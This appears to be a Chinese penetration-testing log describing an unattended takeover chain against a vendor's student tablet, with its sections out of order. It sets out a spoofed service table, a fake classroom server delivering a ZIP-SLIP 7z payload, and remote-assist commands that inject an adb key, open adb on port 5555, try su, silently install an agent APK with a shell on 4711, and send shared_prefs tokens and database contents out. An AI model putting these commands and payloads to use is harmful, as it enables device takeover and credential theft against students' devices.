## 八、12:20 第二个修复：HTTP+Auth 通道直接回 OPEN_FTP 信封

```
实测: 端侧 IM/教室通道是"明文 HTTP + Auth 头"(GET / HTTP/1.1 + Auth:{boundId,role})
      —— 见 classroom.log: [HTTP-ON-WS-PORT-RAW] GET / HTTP/1.1 | Auth: {"boundId":"UR6V4HX2","role":"student"}
此前该通道只回一个通用 JSON(type=0), 端侧不会触发任何下载。
现改为直接回 **OPEN_FTP_CODE 信封**:
  {"cmd":0,"ct":"","from":"teacher","gt":0,"cId":"",
   "smsg":{"classRoomId":"<课堂ID>","createTag":"default_tag","data":"{...}",
           "forward":0,"senderId":0,"type":50001,"userIds":"<userId>"}}
  data = {"hostName":"<内网IP>","port":8080,"rootPath":".../../../../../data/data/...",
          "downloadWaitTime":3,"startLimitRate":0.015}
本地自测: 应答 520B, 信封字段 ['cmd','ct','from','gt','cId','smsg'], smsg.type=50001 ✓
⇒ 端侧首次轮询即 downloadFromTeacher(...) ⇒ 下载我方载荷 ⇒ rootPath 穿越写盘(ZIP-SLIP)

两处修复合拢:
  ① 服务表补 SB103017/SB103020=<内网IP>:8889  ⇒ 端侧教室/IM 连接来到我方
  ② HTTP+Auth 通道回 OPEN_FTP 信封                    ⇒ 连上即触发下载+穿越写
```

## 九、12:25 第三个修复：教室载荷服务默认返回 ZIP-SLIP 载荷

```
发现: 端侧 getFileUrl(p1,p2) = address + rootPath + "/" + p1 + "/" + p2  —— **无扩展名**
      (StuFtpManager:492 逐字节确认: StringBuilder append address,rootPath,File.separator,p1,File.separator,p2)
      而 fake_classroom 的 8080 分派只认 ".7z"/".cwp"/"stage2" 关键字, 其它一律给 payload.xml(170B)
      ⇒ 端侧会拿到 XML 而非 7z ⇒ 越界写根本不会发生 ✗

修复: 8080 的默认分支改为返回 payload_slip.7z(该端口唯一消费者就是教室 FTP 下载);
      `.xml` 显式请求仍给 payload.xml。

实测(md5 对齐):
  期望 md5(payload_slip.7z)        = fee83ce2a5c6daa37d323159b5d87678
  /sdcard/xuehai/share/../../../../data/data/.../abc/def → 14,092B  md5=fee83ce2a5c6 ★
  /sdcard/xuehai/share/9f/86/xhshare_123456              → 14,092B  md5=fee83ce2a5c6 ★
  日志: [FTP-7Z-SERVE] 下发 ZIP-SLIP 载荷 (14092B, 含 ../ 条目)

⇒ 教室链四步全部对齐(全明文/无人值守):
  ① 明文服务表把 SB103017/SB103020 指向 <内网IP>:8889
  ② 端侧连入 ⇒ HTTP+Auth 通道立刻回 OPEN_FTP_CODE 信封(hostName/port/rootPath 皆我方控制)
  ③ 端侧按 getFileUrl() 拼 URL 来 8080 取文件 ⇒ 现在必定拿到恶意 7z
  ④ 端侧 7-Zip(无 ../ 校验, 已原生实证) 解压 ⇒ 任意路径写盘
```

## 十、13:20 第四处加固：轮询轮换 + 全端口一致

```
实测 6 个端口(8889/8887/8886/8888/8083/8088) 对同一 "GET / + Auth" 请求的应答完全一致:
  HTTP/1.1 200 OK + {"cmd":..,"smsg":{"type":50001,...}}  (520B)  ✓

新增: HTTP+Auth 通道按轮询次数轮换 messageType（避免端侧按内容去重后静默忽略）
  每 3 次: 2 次 cmd=0 OPEN_FTP(下载触发, 核心) + 1 次 cmd=11 老师上线(使端侧进入课堂态)
验证: 第1/2/4/5 次 cmd=0, 第3 次 cmd=11, smsg.type 恒为 50001 ✓
日志: [HTTP-ON-WS-PORT-REPLY#N] cmd=0 OPEN_FTP / cmd=11 老师上线
```

## 十一、13:45 落点校准：ROOT_PATH → /sdcard/xuehai/share（端侧确定可写）

```
依据: 端侧应用只能写 ①自身沙箱(/data/data/<自身包名>、/sdcard/Android/data/<自身包名>) ②/sdcard 公共区;
      写其它应用私有目录会被系统拒绝。
而 /sdcard/xuehai/config/… 与 /sdcard/xuehai/keep/… 恰是**启动器会读**的共享配置目录 ⇒ 落在公共区才有效。
ROOT_PATH = /sdcard/xuehai/share  (原值 "./../../../data/data/<学生包名>/shared_prefs" 已弃用)
  下载物落 ./share/<p1>/<p2>, 载荷内 ../ 深度 3~11 的条目正好向上越出(/ → sdcard/xuehai/keep/…, sdcard/xuehai/config/…) ⇒ 与设计匹配

端到端验证(本轮实测):
  信封 cmd=0 smsg.type=50001 hostName=<内网IP> port=8080 rootPath=/sdcard/xuehai/share
  端侧将请求 http://<内网IP>:8080/sdcard/xuehai/share/a1/b2
    → HTTP 200  14,092B  md5=fee83ce2a5c6daa37d323159b5d87678  ★命中 ZIP-SLIP 载荷 ✓
```

# ★★★ 全明文无人值守接管链 —— 最终确认（2026-10-07 13:45 · 双链全通 + 落点校准）

## 七、11:45 重大修正：教室链"没人连"的根因 = 服务表漏了 IM/教室类型

```
用【真实服务表】(real_micro_table.json, 无需鉴权从 <厂商域名> 拉取) 与我方声明逐项比对:
  真实表有、我方未声明的 4 个类型:
    SB103017 -> 47.99.214.197:8889      ← ★ 设备实测连过的 IM/教室服务(带 Auth 头)
    SB103020 -> 47.99.214.197:8889 / 47.99.229.40:8889
    SB103016 -> 192.168.5.70:8080       (文件服务)
    SB103027 -> 121.43.185.46 / 47.97.119.18 : /XHFileServer
⇒ 已补入我方服务表并把端口照搬(8889), 地址指向 <内网IP>:
    SB103017 → <内网IP>:8889   SB103020 → <内网IP>:8889
    SB103016 → <内网IP>:8080   SB103027 → <内网IP>:8000
⇒ 端侧教室/IM 连接将落到我方 fake_classroom(正在 8889 监听, 可下发恶意 7z ⇒ ZIP-SLIP 越界写)
   这很可能就是"伪教室一直无人连"的根因（此前从未声明这两个类型）。
验证: micro_v1() 生成 23 类型 / 46 条目, 六个关键类型全部出现且地址端口正确 ✓
```

## 六、09:45 补强：不依赖厂商 SDK 的安装路径（第 11 条版）

```
新增 step9/10/11:
  step9  downloadFile("http://<内网IP>/agent_wordstack.apk", "/sdcard/Download/agent_ws.apk")
  step10 executeCmd("ls -l ...; pm install -r /sdcard/Download/agent_ws.apk")          ← 特权系统应用适用
  step11 executeCmd(<base64> = "id; su -c 'pm install -r /sdcard/Download/agent_ws.apk'")  ← root 适用

⇒ 五条并行取胜路径:
   A. adb 5555 打开 ⇒ adbwatch 自动 connect ⇒ shell
   B. su 通道 ⇒ root shell
   C. installAppOnline ⇒ 厂商 SdkProcessor 静默安装 ⇒ 4711
   D. token 外带（step7/8）⇒ 用会话 token 在服务端直调 HTTPS 接口
   E. pm install（直装 or su）⇒ agent 装上 ⇒ 4711

新增工具: pentest\token_extract.py（从 assist_result.log 抽取 token/userId/schoolId/deviceId）
复核: 两个服务器下发的 11 条指令, executeCmd 内嵌双引号风险 = 0（开 adb / su 安装均走 base64）
```


## 〇、最终武装：combo 8 条指令（已自测下发成功，语法风险 0）

```
step1 权限画像        executeCmd("id; getprop ro.board.platform; ... su 检测; adb 状态; device_policy ...")
step2 直开 adb        executeCmd(<base64>) = 注入我方 adb 公钥 → /data/misc/adb/adb_keys
                                          + settings adb_enabled/development_settings
                                          + setprop service.adb.tcp.port 5555 + ctl.restart adbd
step3 su 开 root adb  executeCmd(<base64>) = su 通道开 root adbd(uid=0)
step4 静默装包        installAppOnline("http://<内网IP>/agent_wordstack.apk")
                      ⇒ 下载(明文) + BaseProcessorCompat.installApk(SdkProcessor 厂商SDK)
step5 系统配置        getSystemConfig()
step6 私有目录枚举    executeCmd("ls -la /data/data/<启动器包名>/ ... /sdcard/xuehai/config/ ...")
step7 ★Token 外带     executeCmd("for f in /data/data/<启动器包名>/shared_prefs/*.xml;
                                   do echo ===$f===; cat $f; done | head -c 6000; echo PREFS_END")
                      ⇒ executeCmd 以【启动器自身 uid】运行 ⇒ 能读它自己的私有 SharedPreferences
                      ⇒ 输出经 /assist/result 明文回传 ⇒ 我方落盘 assist_result.log
step8 数据库外带      executeCmd("cat /data/data/<启动器包名>/databases/*.db | strings | head -c 2000")
```
**四条并行取胜路径（任一条成功即接管）**
```
A. adb 5555 打开 ⇒ adbwatch 自动 adb connect ⇒ shell（adb 自带 INSTALL_PACKAGES ⇒ 可 adb install）
B. su 通道      ⇒ root shell
C. installAppOnline ⇒ 静默安装 ⇒ agent 起 4711 ⇒ agent_connect 取 shell（VM 实证含重启自启）
D. token 外带   ⇒ 用会话 token 在**服务端直调 HTTPS 接口**（可查应用列表/更新任务，甚至注册协助任务）
```


## 一、结论：链路已是"全明文 + 无人值守"，只等平板回到热点

```
平板回到热点后自动发生（无需任何人工动作）：
  ① 端侧明文轮询协助接口  GET /api/v1/users/<userId>/devices/<序列号>/assists
                          GET .../assists/assist_marvis_0001/tasks
                          POST .../assist/result
     ⇒ 我们下发 5 条指令（combo 档），端侧逐条执行，结果回传被我方落盘
  ② 三条并行取胜路径（任一条成功即接管）：
     A. executeCmd("setprop service.adb.tcp.port 5555; setprop ctl.restart adbd")
        + 注入我方 adb 公钥到 /data/misc/adb/adb_keys  ⇒ adbwatch 自动 adb connect 5555 拿 shell
        （VM 实证: 非 root 的 adb 安装 = Success，adb 自带 INSTALL_PACKAGES ⇒ 之后可装任何包）
     B. executeCmd("su -c '...'")  ⇒ 若设备已 root 则直接 root adbd
     C. installAppOnline("http://<内网IP>/agent_wordstack.apk")
        ⇒ 端侧下载(明文) + BaseProcessorCompat.installApk(SdkProcessor 厂商系统SDK，免 root)
        ⇒ agent 起 0.0.0.0:4711 ⇒ 我方 agent_connect 取 shell（VM 已端到端实证，含重启自启）
```

## 二、支撑证据链（代码级 + 日志级 + VM 实证）

| 环节 | 结论 | 证据 |
|---|---|---|
| 协助接口是明文 | ✅ | 10-04 19:09:06 `npcap_http80`(仅端口80) 记录到 3 次 assist 命中，且 URL 含真实 `userId=<userId>` + `deviceId=<序列号>` |
| 端侧真的会下载 | ✅ | 10-04 19:22:34 `[APK] 端侧明文下载 APK: /XHSVADAPBUABML/6A10D789CA.apk | Host=xuehaifile.oss...` |
| 协助链有安装指令 | ✅ | `AssistFunc.installAppOnline(url)` → 下载 → `BaseProcessorCompat.installApk(path)` |
| 协助链有命令执行 | ✅ | `AssistFunc.executeCmd(cmd)` → `ZCommand.execCmdForRes` (sh，启动器域) |
| 协助链能读信息 | ✅ | `getSystemConfig/getInstallAppList/getFileTree/getAppInfo` |
| 指令是脚本语言 | ✅ | `<厂商包名>` `ZAZE.g4`：`Identifier '(' args ')'`、`loop{}`、`=` |
| 结果会回传 | ✅ | `upAssistResult` → `AssistModel.upAssistResult` → POST `/assist/result`（我方现已落盘 assist_result.log） |
| adb 免授权可行 | ✅ | `adbkey.pub`(711B) 已就位，open-adb 脚本注入 `/data/misc/adb/adb_keys` |
| 安装命令有效 | ✅ | VM 用**完全相同命令** `pm install -r` 安装**完全相同 APK** → Success；重启自启 |
| 普通应用开不了 adb | ✅(约束) | VM 实测：app-uid `setprop service.adb.tcp.port` → failed；`settings put` → SecurityException |
| 启动器是否特权 | ❓ 待平板回线 | 决定 A 路径是否直通；若不特权则走 C 路径（SdkProcessor） |

## 三、当前武装状态（真实平板侧）

```
cloud_api.py  :8000  ← 真实 HTTP 服务，下发 combo 5 条指令（cmd_mode.txt = combo）  ★已验证
npcap_http80  ← 劫持全部 80 端口明文，下发同类任务组；已加 [ASSIST-TASKS]/[ASSIST-RESULT] 日志
adbwatch.py   ← 每 N 秒 adb connect <内网IP>:5555，成功即抓 shell + id/getprop 落盘
hotspot_watch ← 热点自愈（<内网IP> 丢失即用 WinRT 重开）
tls_passthrough :443 ← 按 SNI 直通（修复 hosts 误导向）
13 个其它组件 ← 教室链/推送/DNS/桥 等
载荷: agent_wordstack.apk(<厂商包名>,vC=999999,1,881,263B,md5 79ed81a3…)
      agent_acldtch.apk(<厂商包名>,vC=999999) / agent.apk
```

## 四、平板回线后的自动流程（我这边已无需人工）

```
T+0   平板连上热点 → 明文服务发现 → 我们应答（协助基址指向本机）
T+?   端侧进入协助态 → 轮询 /assists → /assists/{id}/tasks
       ⇒ 收到 combo 5 条指令
T+几秒 执行 step1(权限画像) → 结果 POST /assist/result → assist_result.log
T+几秒 执行 step2/step3(开 adb, 注入公钥)
       ⇒ 若成功: adbwatch 立刻 [CONNECTED] <内网IP>:5555 → 抓 shell
       ⇒ 我随后 adb install agent_wordstack.apk（adb 有 INSTALL_PACKAGES，免 root）
T+几秒 执行 step4(installAppOnline) ⇒ 下载+静默安装 ⇒ 4711
       ⇒ agent_connect 连 4711 取 shell（重启后也自启）
```

## 五、新增/修改的资产

```
pentest\cloud_api.py        新增 combo 档（探权限+开adb+root开adb+装包+取配置）
pentest\cmd_mode.txt        改为 combo
pentest\npcap_http80.py     ① 任务组升级为 6 条（含 id/getprop/su 探测、开 adb、包名匹配安装）
                            ② 新增 [ASSIST-TASKS] / [ASSIST-RESULT] 日志 + assist_result.log 落盘
pentest\read_assist*.py     协助链分析脚本（3 个）
pentest\read_execmd.py      executeCmd/ZCommand 权限分析
```
